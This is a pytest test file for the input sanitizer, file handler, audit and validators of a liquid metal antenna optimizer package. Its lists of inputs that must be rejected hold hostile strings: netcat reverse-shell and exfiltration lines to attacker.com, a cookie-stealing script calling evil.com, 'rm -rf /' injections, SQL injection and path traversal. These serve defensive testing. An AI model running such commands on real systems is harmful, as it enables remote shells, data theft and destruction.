"""
Comprehensive security and validation tests for liquid metal antenna optimizer.
"""

import pytest
import os
import tempfile
import json
from unittest.mock import Mock, patch, mock_open

from liquid_metal_antenna.utils.security import (
    InputSanitizer, SecureFileHandler, SecurityAudit, SecurityError,
    sanitize_input, get_security_audit
)
from liquid_metal_antenna.utils.validation import (
    ValidationError, validate_frequency_range, validate_geometry,
    validate_material_properties, validate_optimization_parameters,
    validate_file_path, validate_device_string
)


class TestInputSanitizer:
    """Test input sanitization functionality."""
    
    def test_string_sanitization(self):
        """Test basic string sanitization."""
        # Valid string
        safe_string = InputSanitizer.sanitize_string("hello world")
        assert safe_string == "hello world"
        
        # String with control characters
        dirty_string = "hello\x00\x01world\x7f"
        clean_string = InputSanitizer.sanitize_string(dirty_string)
        assert "\x00" not in clean_string
        assert "\x01" not in clean_string
        assert "\x7f" not in clean_string
    
    def test_dangerous_pattern_detection(self):
        """Test detection of dangerous patterns."""
        dangerous_strings = [
            "../etc/passwd",  # Directory traversal
            "..\\windows\\system32",  # Windows directory traversal
            "~/secret",  # Home directory access
            "$USER",  # Environment variable
            "`rm -rf /`",  # Command injection
            "$(evil_command)",  # Command substitution
            "command1; command2",  # Command chaining
            "data | nc attacker.com",  # Pipe to external command
            "<script>alert('xss')</script>",  # Script injection
            "javascript:alert('xss')",  # JavaScript URL
            "data:text/html,<script>alert('xss')</script>",  # Data URL
        ]
        
        for dangerous in dangerous_strings:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_string(dangerous)
    
    def test_string_length_limits(self):
        """Test string length validation."""
        # Normal length string
        normal_string = "a" * 100
        sanitized = InputSanitizer.sanitize_string(normal_string)
        assert len(sanitized) == 100
        
        # Too long string
        long_string = "a" * 20000
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_string(long_string)
    
    def test_filename_sanitization(self):
        """Test filename sanitization."""
        # Valid filename
        valid_filename = "antenna_design.json"
        sanitized = InputSanitizer.sanitize_filename(valid_filename)
        assert sanitized == valid_filename
        
        # Filename with path separators
        path_filename = "path/to/file.json"
        sanitized = InputSanitizer.sanitize_filename(path_filename)
        assert "/" not in sanitized
        assert sanitized == "path_to_file.json"
        
        # Filename with dangerous characters
        dangerous_filename = "file<script>.json"
        sanitized = InputSanitizer.sanitize_filename(dangerous_filename)
        assert "<script>" not in sanitized
    
    def test_reserved_filename_handling(self):
        """Test Windows reserved filename handling."""
        reserved_names = ["CON.txt", "PRN.json", "AUX.dat", "COM1.log"]
        
        for reserved in reserved_names:
            sanitized = InputSanitizer.sanitize_filename(reserved)
            assert sanitized.startswith("safe_")
    
    def test_path_sanitization(self):
        """Test file path sanitization."""
        # Valid relative path
        valid_path = "data/antennas/design.json"
        sanitized = InputSanitizer.sanitize_path(valid_path)
        assert os.path.isabs(sanitized)  # Should be made absolute
        
        # Path with base directory restriction
        with tempfile.TemporaryDirectory() as temp_dir:
            safe_path = os.path.join(temp_dir, "file.txt")
            sanitized = InputSanitizer.sanitize_path(safe_path, temp_dir)
            assert sanitized.startswith(temp_dir)
            
            # Path outside base directory should raise error
            outside_path = "/etc/passwd"
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_path(outside_path, temp_dir)
    
    def test_json_sanitization(self):
        """Test JSON data sanitization."""
        # Valid JSON object
        valid_json = {
            "frequency": 2.4e9,
            "gain": 5.2,
            "design": "patch_antenna"
        }
        sanitized = InputSanitizer.sanitize_json(valid_json)
        assert sanitized["frequency"] == 2.4e9
        assert sanitized["gain"] == 5.2
        
        # JSON string
        json_string = '{"test": "value"}'
        sanitized = InputSanitizer.sanitize_json(json_string)
        assert sanitized["test"] == "value"
        
        # JSON with dangerous content
        dangerous_json = {
            "script": "<script>alert('xss')</script>",
            "../path": "traversal_attempt",
            "command": "$(rm -rf /)"
        }
        
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_json(dangerous_json)
    
    def test_json_depth_limit(self):
        """Test JSON nesting depth limits."""
        # Create deeply nested JSON
        deeply_nested = {"level": 1}
        current = deeply_nested
        for i in range(2, 15):  # Create 14 levels of nesting
            current["next"] = {"level": i}
            current = current["next"]
        
        # Should reject overly nested JSON
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_json(deeply_nested)
    
    def test_json_size_limits(self):
        """Test JSON size limits."""
        # Large JSON string
        large_json = '{"data": "' + 'x' * 2000000 + '"}'  # 2MB string
        
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_json(large_json)


class TestSecureFileHandler:
    """Test secure file operations."""
    
    def test_safe_file_read(self):
        """Test secure file reading."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            # Create test file
            test_file = os.path.join(temp_dir, "test.txt")
            with open(test_file, 'w') as f:
                f.write("test content")
            
            # Read file safely
            content = handler.safe_read_file(test_file)
            assert content == "test content"
            
            # Try to read non-existent file
            with pytest.raises(SecurityError):
                handler.safe_read_file(os.path.join(temp_dir, "nonexistent.txt"))
    
    def test_file_size_limits(self):
        """Test file size limits during read operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            # Create large file
            large_file = os.path.join(temp_dir, "large.txt")
            with open(large_file, 'w') as f:
                f.write("x" * 1000000)  # 1MB file
            
            # Should reject file that's too large
            with pytest.raises(SecurityError):
                handler.safe_read_file(large_file, max_size=100000)  # 100KB limit
    
    def test_safe_file_write(self):
        """Test secure file writing."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            # Write file safely
            test_file = os.path.join(temp_dir, "output.txt")
            handler.safe_write_file(test_file, "test content", overwrite=False)
            
            # Verify content
            with open(test_file, 'r') as f:
                assert f.read() == "test content"
            
            # Try to overwrite without permission
            with pytest.raises(SecurityError):
                handler.safe_write_file(test_file, "new content", overwrite=False)
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            # Try to write outside base directory
            malicious_path = "../../../etc/passwd"
            with pytest.raises(SecurityError):
                handler.safe_write_file(malicious_path, "malicious content")
    
    def test_atomic_file_operations(self):
        """Test atomic file write operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            test_file = os.path.join(temp_dir, "atomic.txt")
            
            # Simulate write interruption
            original_replace = os.replace
            def failing_replace(src, dst):
                raise OSError("Simulated failure")
            
            with patch('os.replace', failing_replace):
                with pytest.raises(SecurityError):
                    handler.safe_write_file(test_file, "content")
            
            # Original file should not exist (atomic failure)
            assert not os.path.exists(test_file)
    
    def test_temporary_file_creation(self):
        """Test secure temporary file creation."""
        handler = SecureFileHandler()
        
        temp_path, temp_handle = handler.safe_create_temp_file(
            suffix=".json", prefix="antenna_"
        )
        
        try:
            assert temp_path.startswith(tempfile.gettempdir())
            assert "antenna_" in os.path.basename(temp_path)
            assert temp_path.endswith(".json")
            
            # Write to temp file
            temp_handle.write("temporary content")
            temp_handle.close()
            
            # Read back
            with open(temp_path, 'r') as f:
                assert f.read() == "temporary content"
        
        finally:
            # Clean up
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    def test_secure_file_deletion(self):
        """Test secure file deletion with confirmation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            # Create test file
            test_file = os.path.join(temp_dir, "delete_me.txt")
            content = "content to delete"
            with open(test_file, 'w') as f:
                f.write(content)
            
            # Delete with content confirmation
            import hashlib
            content_hash = hashlib.sha256(content.encode()).hexdigest()
            
            handler.safe_delete_file(test_file, confirm_content=content_hash)
            
            # File should be deleted
            assert not os.path.exists(test_file)
            
            # Try to delete with wrong confirmation
            test_file2 = os.path.join(temp_dir, "delete_me2.txt")
            with open(test_file2, 'w') as f:
                f.write("different content")
            
            with pytest.raises(SecurityError):
                handler.safe_delete_file(test_file2, confirm_content="wrong_hash")


class TestSecurityAudit:
    """Test security auditing functionality."""
    
    def test_security_event_logging(self):
        """Test security event logging."""
        audit = SecurityAudit()
        
        audit.log_security_event(
            event_type="input_validation",
            description="Dangerous pattern detected in user input",
            severity="WARNING",
            context={"input": "sanitized_for_logging", "pattern": ".."}
        )
        
        assert len(audit.audit_entries) == 1
        entry = audit.audit_entries[0]
        assert entry["event_type"] == "input_validation"
        assert entry["severity"] == "WARNING"
        assert "timestamp" in entry
    
    def test_file_permission_checking(self):
        """Test file permission analysis."""
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_file.write(b"test content")
            temp_file_path = temp_file.name
        
        try:
            audit = SecurityAudit()
            
            # Check permissions on temporary file
            perm_info = audit.check_file_permissions(temp_file_path)
            
            assert "permissions" in perm_info
            assert "octal_mode" in perm_info
            assert "warnings" in perm_info
            
            # Make file world-writable (dangerous)
            os.chmod(temp_file_path, 0o666)
            perm_info = audit.check_file_permissions(temp_file_path)
            
            assert len(perm_info["warnings"]) > 0
            assert any("writable" in warning for warning in perm_info["warnings"])
        
        finally:
            os.unlink(temp_file_path)
    
    def test_directory_security_scan(self):
        """Test directory security scanning."""
        with tempfile.TemporaryDirectory() as temp_dir:
            audit = SecurityAudit()
            
            # Create various test files
            normal_file = os.path.join(temp_dir, "normal.txt")
            with open(normal_file, 'w') as f:
                f.write("normal content")
            
            hidden_file = os.path.join(temp_dir, ".hidden")
            with open(hidden_file, 'w') as f:
                f.write("hidden content")
            
            # Scan directory
            results = audit.scan_directory_security(temp_dir)
            
            assert "directory" in results
            assert "scan_time" in results
            assert "file_count" in results
            assert "suspicious_files" in results
            
            # Should detect hidden file as suspicious
            assert results["file_count"] >= 2
            hidden_files = [f for f in results["suspicious_files"] 
                          if f["reason"] == "Hidden file"]
            assert len(hidden_files) >= 1
    
    def test_security_audit_report(self):
        """Test comprehensive security audit reporting."""
        audit = SecurityAudit()
        
        # Log various events
        audit.log_security_event("input_validation", "Test event 1", "INFO")
        audit.log_security_event("file_access", "Test event 2", "WARNING")
        audit.log_security_event("authentication", "Test event 3", "ERROR")
        
        # Generate report
        report = audit.generate_audit_report()
        
        assert "report_time" in report
        assert "total_events" in report
        assert "event_types" in report
        assert "severity_distribution" in report
        assert "security_score" in report
        
        # Check event counting
        assert report["total_events"] == 3
        assert report["severity_distribution"]["INFO"] == 1
        assert report["severity_distribution"]["WARNING"] == 1
        assert report["severity_distribution"]["ERROR"] == 1
        
        # Security score should reflect event severities
        assert 0 <= report["security_score"] <= 100


class TestValidationFunctions:
    """Test validation utility functions."""
    
    def test_frequency_range_validation(self):
        """Test frequency range validation."""
        # Valid frequency range
        validate_frequency_range((2.4e9, 2.5e9))  # Should not raise
        
        # Invalid ranges
        with pytest.raises(ValidationError):
            validate_frequency_range((2.5e9, 2.4e9))  # Wrong order
        
        with pytest.raises(ValidationError):
            validate_frequency_range((-1e9, 2.4e9))  # Negative frequency
        
        with pytest.raises(ValidationError):
            validate_frequency_range((100, 200))  # Too low frequency
        
        with pytest.raises(ValidationError):
            validate_frequency_range((200e9, 300e9))  # Too high frequency
    
    def test_geometry_validation(self):
        """Test geometry validation."""
        import numpy as np
        
        # Valid geometry
        valid_geometry = np.random.rand(20, 20, 8)
        validate_geometry(valid_geometry)  # Should not raise
        
        # Invalid geometries
        with pytest.raises(ValidationError):
            validate_geometry(np.ones((2, 2, 2)))  # Too small
        
        with pytest.raises(ValidationError):
            validate_geometry(np.ones((1000, 1000, 100)))  # Too large/memory
        
        with pytest.raises(ValidationError):
            invalid_geometry = np.ones((20, 20, 8))
            invalid_geometry[0, 0, 0] = np.nan  # Contains NaN
            validate_geometry(invalid_geometry)
    
    def test_material_properties_validation(self):
        """Test material property validation."""
        # Valid properties
        validate_material_properties(
            dielectric_constant=3.38,
            loss_tangent=0.0027,
            thickness=1.52
        )
        
        # Invalid properties
        with pytest.raises(ValidationError):
            validate_material_properties(
                dielectric_constant=0.5,  # Less than 1
                loss_tangent=0.02,
                thickness=1.6
            )
        
        with pytest.raises(ValidationError):
            validate_material_properties(
                dielectric_constant=4.5,
                loss_tangent=-0.01,  # Negative
                thickness=1.6
            )
        
        with pytest.raises(ValidationError):
            validate_material_properties(
                dielectric_constant=4.5,
                loss_tangent=0.02,
                thickness=-1.0  # Negative thickness
            )
    
    def test_optimization_parameters_validation(self):
        """Test optimization parameter validation."""
        # Valid parameters
        validate_optimization_parameters(
            n_iterations=100,
            learning_rate=0.01,
            tolerance=1e-6
        )
        
        # Invalid parameters
        with pytest.raises(ValidationError):
            validate_optimization_parameters(
                n_iterations=0,  # Zero iterations
                learning_rate=0.01,
                tolerance=1e-6
            )
        
        with pytest.raises(ValidationError):
            validate_optimization_parameters(
                n_iterations=100,
                learning_rate=-0.01,  # Negative learning rate
                tolerance=1e-6
            )
        
        with pytest.raises(ValidationError):
            validate_optimization_parameters(
                n_iterations=100,
                learning_rate=0.01,
                tolerance=-1e-6  # Negative tolerance
            )
    
    def test_file_path_validation(self):
        """Test file path validation."""
        # Valid paths
        validate_file_path("antenna_design.json")
        validate_file_path("/valid/absolute/path.txt")
        
        # Invalid paths
        with pytest.raises(ValidationError):
            validate_file_path("")  # Empty path
        
        with pytest.raises(ValidationError):
            validate_file_path("../../../etc/passwd")  # Path traversal
        
        with pytest.raises(ValidationError):
            validate_file_path("file_with_$_variable.txt")  # Dangerous character
        
        # Extension validation
        with pytest.raises(ValidationError):
            validate_file_path(
                "file.exe", 
                allowed_extensions=[".txt", ".json"]
            )
    
    def test_device_string_validation(self):
        """Test device string validation."""
        # Valid devices
        validate_device_string("cpu")
        validate_device_string("cuda")
        validate_device_string("cuda:0")
        validate_device_string("cuda:1")
        
        # Invalid devices
        with pytest.raises(ValidationError):
            validate_device_string("invalid_device")
        
        with pytest.raises(ValidationError):
            validate_device_string("gpu")  # Should be 'cuda'
        
        with pytest.raises(ValidationError):
            validate_device_string("cuda:-1")  # Negative device ID


class TestSecurityIntegration:
    """Test security integration with main components."""
    
    def test_global_security_audit(self):
        """Test global security audit instance."""
        audit = get_security_audit()
        assert isinstance(audit, SecurityAudit)
        
        # Should return same instance
        audit2 = get_security_audit()
        assert audit is audit2
    
    def test_sanitize_input_convenience_function(self):
        """Test convenience input sanitization function."""
        # String sanitization
        result = sanitize_input("test string", "string")
        assert result == "test string"
        
        # Filename sanitization
        result = sanitize_input("file.txt", "filename")
        assert result == "file.txt"
        
        # Path sanitization
        result = sanitize_input("/tmp/file.txt", "path")
        assert os.path.isabs(result)
        
        # JSON sanitization
        result = sanitize_input('{"key": "value"}', "json")
        assert result["key"] == "value"
        
        # Invalid input type
        with pytest.raises(SecurityError):
            sanitize_input("test", "invalid_type")
    
    def test_security_with_real_world_attacks(self):
        """Test security against real-world attack patterns."""
        attack_vectors = [
            # Directory traversal variations
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            
            # Command injection
            "; rm -rf /",
            "| nc attacker.com 4444 -e /bin/sh",
            "&& whoami",
            
            # Script injection
            "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
            "javascript:void(0)",
            "vbscript:msgbox(\"XSS\")",
            
            # SQL injection patterns (even though not directly applicable)
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            
            # File inclusion
            "../../../../proc/self/environ",
            "/proc/self/fd/0",
            
            # Null byte injection
            "file.txt\x00.exe",
            
            # Format string attacks
            "%n%n%n%n",
            "%x %x %x %x",
        ]
        
        for attack in attack_vectors:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_string(attack)
    
    def test_security_performance_impact(self):
        """Test that security measures don't significantly impact performance."""
        import time
        
        # Test with reasonably sized inputs
        test_strings = ["valid_input"] * 1000
        
        start_time = time.time()
        for test_string in test_strings:
            sanitized = InputSanitizer.sanitize_string(test_string)
            assert sanitized == test_string
        
        duration = time.time() - start_time
        
        # Should complete 1000 sanitizations in reasonable time (< 1 second)
        assert duration < 1.0
        
        # Test file operations performance
        with tempfile.TemporaryDirectory() as temp_dir:
            handler = SecureFileHandler(temp_dir)
            
            start_time = time.time()
            for i in range(100):
                file_path = os.path.join(temp_dir, f"test_{i}.txt")
                handler.safe_write_file(file_path, f"content_{i}")
            
            duration = time.time() - start_time
            
            # Should complete 100 file operations in reasonable time (< 2 seconds)
            assert duration < 2.0


if __name__ == '__main__':
    pytest.main([__file__])